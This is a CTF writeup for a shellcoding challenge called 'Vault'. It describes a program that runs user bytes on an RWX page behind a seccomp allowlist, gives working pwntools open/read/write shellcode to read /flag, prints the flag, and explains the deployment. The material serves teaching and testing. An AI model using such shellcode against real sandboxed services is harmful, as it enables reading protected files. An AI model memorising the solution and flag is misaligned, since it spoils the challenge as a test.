# Vault - writeup

A shellcoding challenge with a twist: you get arbitrary code execution *for free* (the program runs
your bytes on an RWX page), but a seccomp filter is installed first, so the usual `execve("/bin/sh")`
is killed. You have to read the flag with syscalls directly - open/read/write shellcode.

## What the program does
```c
page = mmap(RWX);
read(0, page, 0x1000);   // your shellcode
lockdown();              // seccomp filter
((void(*)())page)();     // run it
```
`lockdown()` uses libseccomp with a default `KILL_PROCESS` and allows only:
`open, openat, read, write, close, lseek, fstat, newfstatat, mmap, munmap, brk, rt_sigreturn, exit,
exit_group`. Notably **no execve/execveat** - a shell shellcode just gets SIGSYS'd.

## The ORW shellcode
Open `/flag`, read it, write it to stdout:
```python
sc  = shellcraft.open('/flag')
sc += shellcraft.read('rax', 'rsp', 0x60)   # fd is in rax after open
sc += shellcraft.write(1, 'rsp', 0x60)
sc += shellcraft.exit(0)
payload = asm(sc)
```
Send it, close stdin (EOF, so the program's `read` returns and jumps to your code), and the flag
comes back. `solution/exploit.py` does exactly this.

`H7CTF{s3cc0mp_0rw_sh3llc0d3_v4ult}` (per-team dynamic on the live instance).

## Deploy
Per-team on-demand docker; `entrypoint.sh` seals `$FLAG` into `/flag`, `socat` serves the binary on
tcp/9999. Built in `ubuntu:24.04` with libseccomp. Validated end-to-end: ORW shellcode reads the flag
over TCP, and an `execve` shellcode is confirmed killed (SIGSYS) - so the seccomp really does force the
ORW path.

## Teaching
Writing raw syscall shellcode, and reasoning about seccomp allowlists / ORW - the exact situation you
hit on modern sandboxed pwn targets where a shell is off the table. A different pwn muscle from the
ROP chain in Dispatch: here the bug is "you're handed the CPU," and the challenge is the sandbox.
